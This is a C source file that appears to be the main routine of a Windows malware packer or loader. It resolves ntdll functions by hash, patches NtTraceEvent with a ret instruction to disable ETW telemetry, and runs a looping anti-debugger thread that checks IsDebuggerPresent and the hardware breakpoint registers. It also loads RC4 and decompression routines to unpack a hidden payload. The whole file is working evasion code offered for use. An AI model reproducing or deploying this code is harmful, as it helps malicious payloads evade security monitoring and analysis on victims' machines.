
#include "Windows.h"
#include "unpacker.h"
#include "functions.h"

bool initialized = 0;
HANDLE CurrentProcess = (HANDLE)-1;
HANDLE CurrentThread = (HANDLE)-2;

// Load required libraries and manually resolve functions
void InitFunctions() {
	HANDLE ntdll = _GetModuleHandleW(L"ntdll");
	NtWaitForSingleObject = (_NtWaitForSingleObject)_GetProcAddress(ntdll, 0xae06c1b2);
	NtProtectVirtualMemory = (_NtProtectVirtualMemory)_GetProcAddress(ntdll, 0x8c394d89);
	NtReadVirtualMemory = (_NtReadVirtualMemory)_GetProcAddress(ntdll, 0x3defa5c2);
	NtQueryVirtualMemory = (_NtQueryVirtualMemory)_GetProcAddress(ntdll, 0x4f138492);
	NtQuerySystemInformation = (_NtQuerySystemInformation)_GetProcAddress(ntdll, 0xe4e1cad6);
	LdrLoadDll = (_LdrLoadDll)_GetProcAddress(ntdll, 0xb0988fe4);
	SystemFunction033 = (_SystemFunction033)_GetProcAddress(_LoadLibrary((wchar_t*)L"CRYPTSP"), 0xa8a18339);
	HMODULE Cabinet = _LoadLibrary((wchar_t*)L"Cabinet");
	Decompress = (_Decompress)GetProcAddress(Cabinet, "Decompress"); // Cannot resolve function from PEB for some reason
	CreateDecompressor = (_CreateDecompressor)GetProcAddress(Cabinet, "CreateDecompressor"); // Cannot resolve function from PEB for some reason
	initialized = 1;
	
}

// Find address of NtTraceEvent and patch it with ret (\xc3) instruction 
void PatchEtwAndCtrlFlow() {
	
	DWORD oldProtect = 0;
	SIZE_T bytesWritten = 0;
	SIZE_T size = 0x01;
	unsigned char ret[] = "\xc3";
	char* NtTraceEvent = _GetProcAddress(_GetModuleHandleW(L"ntdll"), 0xe39f1624);

	NTSTATUS status = NtProtectVirtualMemory((HANDLE)-1, &NtTraceEvent, (PULONG)&size, PAGE_EXECUTE_READWRITE, &oldProtect);
	NtTraceEvent = _GetProcAddress(_GetModuleHandleW(L"ntdll"), 0xe39f1624);
	mymemcpy(NtTraceEvent, (char*)&ret, 0x01);
	NtProtectVirtualMemory((HANDLE)-1, &NtTraceEvent, (PULONG)&size, oldProtect, &oldProtect);

#ifdef _DEBUG
		printf("[+] Patched ETW.\r\n");
#endif
	
	
	CtrlFlow((char*)unpack);
}



void CheckDebugger() {
	while (1) {
		bool debugged = 0;
		CONTEXT context = {};

		if (IsDebuggerPresent())
			debugged = 1;

		context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
		GetThreadContext(GetCurrentThread(), &context);
		if (context.Dr0 || context.Dr1 || context.Dr2 || context.Dr3)
			debugged = 1;

		if (debugged) {
#ifdef _DEBUG
			printf("[-] Debugger detected! Exiting. ");
#else
			CtrlFlow((char*)NULL);
#endif

		}
#ifndef _DEBUG
		if (initialized) {
			LARGE_INTEGER Timeout;
			Timeout.QuadPart = -5000000LL; /* Wait for 0.5 second */
			NtWaitForSingleObject(CurrentThread, 0, &Timeout);
		}
		else
			WaitForSingleObject(CurrentThread, 5000); /* Wait for 5 second on initial check */
	}
#endif
}




int main() {
	HANDLE hThread;

	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CheckDebugger, 0, 0, 0);
	WaitForSingleObject(hThread, 5000);
	CtrlFlow((char*)InitFunctions);
	CtrlFlow((char*)PatchEtwAndCtrlFlow);
}